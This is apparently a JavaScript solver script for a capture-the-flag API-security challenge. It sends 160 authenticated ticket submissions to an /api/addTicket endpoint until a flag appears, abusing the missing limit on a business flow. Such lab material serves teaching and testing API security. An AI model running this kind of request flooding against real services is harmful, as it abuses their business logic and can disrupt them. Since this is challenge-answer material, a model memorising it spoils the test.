/**
 * Challenge: 0xa6 - Unrestricted Access to Sensitive Business Flows
 * Exploit: Submit ~160 tickets to /api/addTicket (flag appears after 150 tickets)
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa6');
    log('Starting 0xa6 exploit: Unrestricted Access to Sensitive Business Flows');

    // Submit tickets until we get the flag (need to exceed 150 ticket count)
    log('Submitting multiple tickets to trigger business flow vulnerability...');
    let ticketCount = 0;
    let flagFound = false;
    let flag = null;

    // Submit tickets in batches
    for (let i = 1; i <= 160; i++) {
        const result = await httpRequest(`${baseUrl}/api/addTicket`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
            },
            body: JSON.stringify({
                message: `Ticket ${i} - Automated exploit`,
            }),
        });

        ticketCount++;

        // Check if flag is in response (appears when ticket count > 150)
        const extractedFlag = extractFlag(JSON.stringify(result.data));
        if (extractedFlag) {
            flag = extractedFlag;
            log(`✅ FLAG FOUND at ticket ${ticketCount}: ${flag}`);
            saveFlag(flag);
            flagFound = true;
            break;
        }

        // Progress indicator
        if (i % 20 === 0) {
            log(`Submitted ${i} tickets...`);
        }
    }

    if (flagFound) {
        log(`✅ Exploit successful - flag obtained after ${ticketCount} tickets`);
        return { success: true, flag };
    } else {
        log(`⚠️  Submitted ${ticketCount} tickets but flag not found`);
        return { success: false };
    }
}

module.exports = { run };
